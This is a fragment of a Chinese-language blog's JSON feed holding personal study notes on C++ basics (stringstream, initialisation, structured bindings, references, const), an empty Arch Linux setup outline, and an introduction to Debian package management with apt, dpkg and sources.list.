class=\"token punctuation\">(</span>capitals<span class=\"token punctuation\">,</span>capital<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">getlien</span><span class=\"token punctuation\">(</span>capitals<span class=\"token punctuation\">,</span>country<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"a-string-bufferstringstream\"><a class=\"markdownIt-Anchor\" href=\"#a-string-bufferstringstream\">#</a> A string buffer: <code>stringstream</code></h2>\n<div class=\"note info\">\n<p>有时候，我们想要连接字符串和数字，譬如 <code>&quot;I ate&quot; + 3 &quot;peaches today&quot;</code> ，可是 C++ 不允许我们拼接不一样类型的值，怎么办呢？<br>\n下面我们引入一个新的 <code>stream</code>  类： <code>stringstream</code> 。通过  <code>myStringStream &lt;&lt; &quot;I ate&quot; &lt;&lt; 3 &lt;&lt; &quot;peaches today&quot;</code> , 我们可以实现字符串和其他类型值的拼接。</p>\n</div>\n<p><code>stringstream</code>  是一个类似于 <code>cin</code>  和 <code>cout</code>  的 <code>stream</code> 。和 <code>ifstream/ofstream</code>  一样，在使用 <code>stringstream</code>  前，我们需要先初始化一个 <code>stringstream</code>  类的对象，然后再对这个对象进行读入和写出。 <code>stringstream</code>  和标准 <code>iostream</code>  的差别在于，其写入和写出的值并不保存在程序外，而是作为程序的一个变量，可以通过调用 <code>myStringStream.str()</code>  随时读取。</p>\n<div class=\"note info\">\n<p>在使用 <code>stringstream</code>  之前，需要引入头文件 <code>#include &lt;sstream&gt;</code></p>\n</div>\n<h1 id=\"initialization\"><a class=\"markdownIt-Anchor\" href=\"#initialization\">#</a> Initialization</h1>\n<h2 id=\"初始化结构体\"><a class=\"markdownIt-Anchor\" href=\"#初始化结构体\">#</a> 初始化结构体</h2>\n<h3 id=\"方法一用给每个字段赋值\"><a class=\"markdownIt-Anchor\" href=\"#方法一用给每个字段赋值\">#</a> 方法一：用 <code>.</code>  给每个字段赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Student s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> s<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"Frankie\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> s<span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token string\">\"MN\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> s<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">21</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"方法二用直接赋值\"><a class=\"markdownIt-Anchor\" href=\"#方法二用直接赋值\">#</a> 方法二：用 <code>&#123;&#125;</code>  直接赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Student s <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Frankie\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"MN\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"初始化stdpair\"><a class=\"markdownIt-Anchor\" href=\"#初始化stdpair\">#</a> 初始化 <code>std::pair</code></h2>\n<h3 id=\"方法一用给每个字段赋值-2\"><a class=\"markdownIt-Anchor\" href=\"#方法一用给每个字段赋值-2\">#</a> 方法一：用 <code>.</code>  给每个字段赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> numSuffix1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"st\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"方法二用直接赋值-2\"><a class=\"markdownIt-Anchor\" href=\"#方法二用直接赋值-2\">#</a> 方法二：用 <code>&#123;&#125;</code>  直接赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> numSuffix2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>numSuffix2<span class=\"token punctuation\">.</span>first <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>numSuffix2<span class=\"token punctuation\">.</span>second <span class=\"token operator\">=</span> <span class=\"token string\">\"nd\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"方法三调用stdmake_pairfield1field2方法\"><a class=\"markdownIt-Anchor\" href=\"#方法三调用stdmake_pairfield1field2方法\">#</a> 方法三：调用 <code>std::make_pair(field1,field2)</code>  方法</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> numSuffix2 <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"初始化stdvector\"><a class=\"markdownIt-Anchor\" href=\"#初始化stdvector\">#</a> 初始化 <code>std::vector</code></h2>\n<h3 id=\"方法一使用直接赋值\"><a class=\"markdownIt-Anchor\" href=\"#方法一使用直接赋值\">#</a> 方法一：使用 <code>&#123;&#125;</code>  直接赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// a = &#123;3,5&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"方法二使用vector构造函数赋值\"><a class=\"markdownIt-Anchor\" href=\"#方法二使用vector构造函数赋值\">#</a> 方法二：使用 <code>vector()构造函数</code> 赋值</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>这种情况下，传入的 3 和 5 是构造函数的参数，3 是元素的个数，5 是重复的元素值， <code>a=&#123;5,5,5&#125;</code></p>\n</div>\n<h2 id=\"大括号初始化通用\"><a class=\"markdownIt-Anchor\" href=\"#大括号初始化通用\">#</a> 大括号初始化 (通用)</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> vec<span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> numSuffix1<span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"st\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Student s<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Frankie\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"MN\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// less common/nice for primitive types, but possible!</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">&#123;</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>string f<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Frankie\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"structure-bindings\"><a class=\"markdownIt-Anchor\" href=\"#structure-bindings\">#</a> Structure Bindings</h2>\n<p>可以结合 <code>auto</code>  的自动类型推导来自动绑定值。<br>\n使用前：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">auto</span> p <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>“s”<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>string a <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>使用后：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">auto</span> p <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>“s”<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">auto</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// a is string, b is int</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// auto [a, b] =</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References</h1>\n<div class=\"note info\">\n<ol>\n<li><code>=</code>  默认为赋值值，如果要传入引用，必须在声明引用时加上 <code>&amp;</code> ;</li>\n<li>修改引用时便修改了值本身，而修改复制品不修改本身；</li>\n<li>引用是变量的引用，修改引用前必须声明一个变量，无法对常量进行引用；</li>\n</ol>\n</div>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span><span class=\"token operator\">&amp;</span> ref <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span> <span class=\"token comment\">// the reference of value</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> copy <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span> <span class=\"token comment\">// the copy of value</span></pre></td></tr></table></figure><p>此外，在使用迭代器时，如果要修改被迭代的值本身而不是他的复制品，必须使用引用，例如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">shift</span><span class=\"token punctuation\">(</span>vector<span class=\"token operator\">&lt;</span>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">>></span><span class=\"token operator\">&amp;</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> <span class=\"token punctuation\">[</span>num1<span class=\"token punctuation\">,</span> num2<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tnum1<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\tnum2<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这段代码中， <code>auto [num1,num2]</code>  是 <code>nums</code>  中每个元素的复制品，而不是本身。如果要对本身进行修改，必须使用：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span><span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">[</span>num1<span class=\"token punctuation\">,</span>num2<span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> nums<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"left-value-right-value\"><a class=\"markdownIt-Anchor\" href=\"#left-value-right-value\">#</a> left-value &amp; right-value</h1>\n<p>左值和右值的区别在于，左值通常来说是变量，而右值是字面量。左值可以出现在 <code>=</code>  的左边和右边，是在程序生命周期内长期有效。而右值作为字面量，无法在程序中长期存活，自然也不能出现在 <code>=</code>  的左边。</p>\n<div class=\"note info\">\n<p>在使用引用时，不允许传入右值，即不允许传入字面量。我们无法对一个常量进行引用，只能对左值 (变量) 进行引用。</p>\n</div>\n<h1 id=\"const-const-referencecopy\"><a class=\"markdownIt-Anchor\" href=\"#const-const-referencecopy\">#</a> const &amp; const reference/copy</h1>\n<p>常量是不允许修改的量，使用 <code>const</code>  声明常量。常量的引用和复制也必须是常量，引用及复制前加 <code>const</code> 。</p>\n<h1 id=\"containers\"><a class=\"markdownIt-Anchor\" href=\"#containers\">#</a> Containers</h1>\n<h2 id=\"stl-是什么\"><a class=\"markdownIt-Anchor\" href=\"#stl-是什么\">#</a> STL 是什么？</h2>\n<h2 id=\"stl-overview\"><a class=\"markdownIt-Anchor\" href=\"#stl-overview\">#</a> STL Overview</h2>\n<h2 id=\"为什么需要-stl\"><a class=\"markdownIt-Anchor\" href=\"#为什么需要-stl\">#</a> 为什么需要 STL？</h2>\n<h2 id=\"vector\"><a class=\"markdownIt-Anchor\" href=\"#vector\">#</a> vector</h2>\n<p><code>push_back</code>   <code>insert</code>   <code>pop_back</code>   <code>erase</code>   <code>resize</code></p>\n<h2 id=\"deque\"><a class=\"markdownIt-Anchor\" href=\"#deque\">#</a> deque</h2>\n<h1 id=\"iterators-and-pointers\"><a class=\"markdownIt-Anchor\" href=\"#iterators-and-pointers\">#</a> Iterators and Pointers</h1>\n<h1 id=\"classes\"><a class=\"markdownIt-Anchor\" href=\"#classes\">#</a> Classes</h1>\n<h1 id=\"template-classes-and-const-correctness\"><a class=\"markdownIt-Anchor\" href=\"#template-classes-and-const-correctness\">#</a> Template Classes and Const Correctness</h1>\n<h1 id=\"template-functions\"><a class=\"markdownIt-Anchor\" href=\"#template-functions\">#</a> Template Functions</h1>\n<h1 id=\"functions-and-lambdas\"><a class=\"markdownIt-Anchor\" href=\"#functions-and-lambdas\">#</a> Functions and Lambdas</h1>\n<h1 id=\"midquarter-review\"><a class=\"markdownIt-Anchor\" href=\"#midquarter-review\">#</a> Midquarter Review</h1>\n<h1 id=\"operators\"><a class=\"markdownIt-Anchor\" href=\"#operators\">#</a> Operators</h1>\n<h1 id=\"special-member-functions\"><a class=\"markdownIt-Anchor\" href=\"#special-member-functions\">#</a> Special Member Functions</h1>\n<h1 id=\"move-semantics\"><a class=\"markdownIt-Anchor\" href=\"#move-semantics\">#</a> Move Semantics</h1>\n<h1 id=\"stdoptional-and-type-safety\"><a class=\"markdownIt-Anchor\" href=\"#stdoptional-and-type-safety\">#</a> std::optional and Type Safety</h1>\n<h1 id=\"raii-smart-pointers-and-building-c-projects\"><a class=\"markdownIt-Anchor\" href=\"#raii-smart-pointers-and-building-c-projects\">#</a> RAII, Smart Pointers, and Building C++ Projects</h1>\n<h1 id=\"c-for-data-science-and-ml\"><a class=\"markdownIt-Anchor\" href=\"#c-for-data-science-and-ml\">#</a> C++ for Data Science and ML</h1>\n",
            "tags": [
                "C++"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/",
            "url": "https://salvely.github.io/blog/2023/10/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/",
            "title": "Arch Linux系统配置教程",
            "date_published": "2023-10-15T01:38:16.000Z",
            "content_html": "<h1 id=\"初始化用户和组\"><a class=\"markdownIt-Anchor\" href=\"#初始化用户和组\">#</a> 初始化用户和组</h1>\n<h1 id=\"权限授予\"><a class=\"markdownIt-Anchor\" href=\"#权限授予\">#</a> 权限授予</h1>\n<h1 id=\"安全性配置\"><a class=\"markdownIt-Anchor\" href=\"#安全性配置\">#</a> 安全性配置</h1>\n<h1 id=\"安装基本组件\"><a class=\"markdownIt-Anchor\" href=\"#安装基本组件\">#</a> 安装基本组件</h1>\n<h1 id=\"让系统更易用\"><a class=\"markdownIt-Anchor\" href=\"#让系统更易用\">#</a> 让系统更易用</h1>\n",
            "tags": [
                "Arch",
                "Linux",
                "配置教程",
                "操作系统",
                "notes"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/Debain%E5%8C%85%E7%AE%A1%E7%90%86/",
            "url": "https://salvely.github.io/blog/2023/10/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Debian/Debain%E5%8C%85%E7%AE%A1%E7%90%86/",
            "title": "Debian包管理初探",
            "date_published": "2023-10-14T06:23:52.000Z",
            "content_html": "<h1 id=\"linux-发行版\"><a class=\"markdownIt-Anchor\" href=\"#linux-发行版\">#</a> Linux 发行版</h1>\n<p>Linux 操作系统 = Linux 内核 + 不同功能<br>\n但是因为内核和功能包有多种不同配置，因此 Linux 有多种发行版。<br>\n几种主要的发行版及其衍生是：</p>\n<ul>\n<li>Arch -&gt; Manjaro</li>\n<li>Debian -&gt; Ubuntu</li>\n<li>RHEL -&gt; Scientific Linux</li>\n</ul>\n<h1 id=\"安装软件的困惑\"><a class=\"markdownIt-Anchor\" href=\"#安装软件的困惑\">#</a> 安装软件的困惑？</h1>\n<div class=\"note default\">\n<p>我们要在 Linux 操作系统上安装一个软件，思考如下问题：</p>\n</div>\n<ul>\n<li>你需要哪些文件？如何获取他们？</li>\n<li>用户需要做多少工作？</li>\n<li>开发者需要做多少工作？</li>\n<li>在发行软件的过程中还有其他人参与工作吗？</li>\n<li>如何更新软件包？</li>\n<li>如何保证软件包来源的安全性？</li>\n</ul>\n<div class=\"note default\">\n<p>一个简陋的安装方案是：直接下载一堆文件。这其中包含的内容有：</p>\n</div>\n<ul>\n<li>编译好的二进制可执行文件</li>\n<li>配置信息</li>\n<li>说明文档</li>\n<li>许可证 (License)</li>\n<li>其他</li>\n</ul>\n<div class=\"note default\">\n<p>那么问题来了：</p>\n</div>\n<ul>\n<li>我们需要哪些文件？</li>\n<li>这些文件放在哪里？</li>\n<li>如何进行环境配置？</li>\n<li>这个安装包和我的系统兼容吗？</li>\n<li>我怎么更新呢？</li>\n</ul>\n<div class=\"note default\">\n<p>一个进阶的安装方案是：下载一个压缩包。但是我们也面临一些问题：</p>\n</div>\n<ul>\n<li>这里面的文件是编译好的还是未编译的？</li>\n<li>软件包之间存在依赖关系怎么办？</li>\n<li>这个软件如何应对不同 Linux 发行版的需求？</li>\n<li>如何更新？如何保证更新后的版本可靠？</li>\n</ul>\n<h1 id=\"解决方案打包\"><a class=\"markdownIt-Anchor\" href=\"#解决方案打包\">#</a> 解决方案：打包！</h1>\n<h2 id=\"什么是包\"><a class=\"markdownIt-Anchor\" href=\"#什么是包\">#</a> 什么是包？</h2>\n<p>包是 Linux 操作系统上软件的组织方式。</p>\n<h2 id=\"什么是仓库repository\"><a class=\"markdownIt-Anchor\" href=\"#什么是仓库repository\">#</a> 什么是仓库（ <code>repository</code> ）？</h2>\n<p>仓库是一系列软件包的合集列表。 <code>Debian</code>  上常见的仓库包括：</p>\n<ul>\n<li>Debian stable (all the packages available to install on a default Debian stable install)</li>\n<li>Debian security updates</li>\n<li>Debian backports</li>\n<li>Docker’s custom repositories</li>\n</ul>\n<p>其中：</p>\n<ul>\n<li>每个 Linux 发行版都维护仓库，里面列举了该仓库中可安装的所有软件包</li>\n<li>包维护者负责对开发者的软件进行打包</li>\n<li>对于不同的 Linux 发行版，打包的方式不同</li>\n</ul>\n<div class=\"note info\">\n<p>包和仓库区别的详细解释参考这里:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xMDkwNzU4L3doYXQtYXJlLXBhY2thZ2VzLWFuZC1yZXBvc2l0b3JpZXM=\">what are packages and repositories</span></li>\n<li><a href=\"https://linux.cn/article-14994-1.html\"> <code>apt-update</code>  和 <code>apt-upgrade</code>  的区别</a></li>\n</ul>\n</div>\n<h1 id=\"包的安装过程\"><a class=\"markdownIt-Anchor\" href=\"#包的安装过程\">#</a> 包的安装过程</h1>\n<ol>\n<li>从包列表中读取该包</li>\n<li>查看该包的所有依赖项</li>\n<li>看看依赖项中哪些包已经安装了</li>\n<li>安装未安装的依赖</li>\n<li>解压缩文件等</li>\n<li>完成一些安装后需要做的工作，如将其作为 <code>service</code>  启动</li>\n</ol>\n<!-- # 仓库 vs App Store\n仓库和App Store均是集中管理包的地方，但是他们略有不同。\n## 软件包更新方式\n仓库：\n- 维护者负责发布更新\n- 部分不稳定的更新会延迟\n- 用户可自己选择使用测试版\nApp Store：\n- 开发者直接向用户推送更新\n- 可能随机挑选用户测试更新\n## 安全方面和依赖管理方面\n仓库：\n- 用户可信赖开发者\nApp Store:\n- 具有隔离性，一切依赖开发者决定 -->\n<h1 id=\"包更新方式\"><a class=\"markdownIt-Anchor\" href=\"#包更新方式\">#</a> 包更新方式</h1>\n<ul>\n<li>部分 Linux 发行版采用 <code>periodic release</code>  方式，例如 <code>Debian</code> ，2 年一发行</li>\n<li>部分采用 <code>rolling release</code>  方式，例如 <code>Arch</code> ，发行版更新更快，但是是以稳定性为代价<br>\n更多内容参考这里：<span class=\"exturl\" data-url=\"aHR0cHM6Ly91dGNjLnV0b3JvbnRvLmNhL35ja3Mvc3BhY2UvYmxvZy9saW51eC9Sb2xsaW5nVnNSZWxlYXNlc05vV2lubmVy\">Rolling distribution releases versus periodic releases are a tradeoff</span></li>\n</ul>\n<h1 id=\"自动化包管理工具\"><a class=\"markdownIt-Anchor\" href=\"#自动化包管理工具\">#</a> 自动化包管理工具</h1>\n<h2 id=\"apt\"><a class=\"markdownIt-Anchor\" href=\"#apt\">#</a>  <code>apt</code></h2>\n<ol>\n<li><code>apt update</code> ：生成列表，显示仓库中包含哪些包</li>\n<li><code>apt upgrade</code> / <code>apt dist-upgrade</code> ：把列表中的包升级到最新版本</li>\n<li><code>apt policy &lt;packagename&gt;</code> ：列举可安装的包版本</li>\n<li><code>apt -t [targetrelease] install [package]</code> ：安装特定版本包</li>\n<li><code>apt install &lt;packagename&gt;</code> ：安装包</li>\n<li><code>apt remove &lt;packagename&gt;</code> ：卸载包</li>\n<li><code>apt search &lt;packagename&gt;</code> ：搜索包</li>\n<li><code>apt install ./&lt;packagename&gt;.deb</code> ：安装本地的 <code>deb</code>  包</li>\n<li><code>apt download &lt;packagename&gt;.deb</code> ：下载包<div class=\"note info\">\n<p>几种不同命令的区别参考这里：</p>\n</div>\n</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xOTQ2NTEvd2h5LXVzZS1hcHQtZ2V0LXVwZ3JhZGUtaW5zdGVhZC1vZi1hcHQtZ2V0LWRpc3QtdXBncmFkZQ==\">Why use apt-get upgrade instead of apt-get dist-upgrade?</span><br>\n:::</li>\n</ul>\n<h2 id=\"dpkg多用于安装本地包\"><a class=\"markdownIt-Anchor\" href=\"#dpkg多用于安装本地包\">#</a>  <code>dpkg</code> : 多用于安装本地包</h2>\n<ol>\n<li><code>dpkg -i [packagefilename]</code> ：安装本地包</li>\n<li><code>dpkg --remove [packagename]</code> ：卸载本地包</li>\n<li><code>dpkg -I [packagename]</code> ：查看本地包的更多信息</li>\n<li><code>dpkg --configure -a</code> ：查看所有解压了但是还没安装的包</li>\n</ol>\n<h2 id=\"使用什么包\"><a class=\"markdownIt-Anchor\" href=\"#使用什么包\">#</a> 使用什么包？</h2>\n<p>在 <code>/etc/apt/sources.list</code>  和 <code>/etc/apt/sources.list.d</code>  文件中维护镜像源：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>deb http://mirrors/debian/ stretch-backports main contrib non-free</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>deb http://mirrors/debian-security/ stretch/updates main contrib non-free</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>deb-src http://mirrors/debian-security/ stretch/updates main contrib non-free</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>deb http://mirrors/debian/ stretch-updates main contrib non-free</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>deb-src http://mirrors/debian/ stretch-updates main contrib non-free</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>deb http://mirrors/debian/ stretch main contrib non-free</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>deb-src http://mirrors/debian/ stretch main contrib non-free</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># OCF</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>deb http://apt/ stretch-backports main</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>deb-src http://apt/ stretch-backports main</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>deb http://apt/ stretch main</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>deb-src http://apt/ stretch main</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>deb http://mirrors/puppetlabs/apt/ stretch puppet</pre></td></tr></table></figure><div 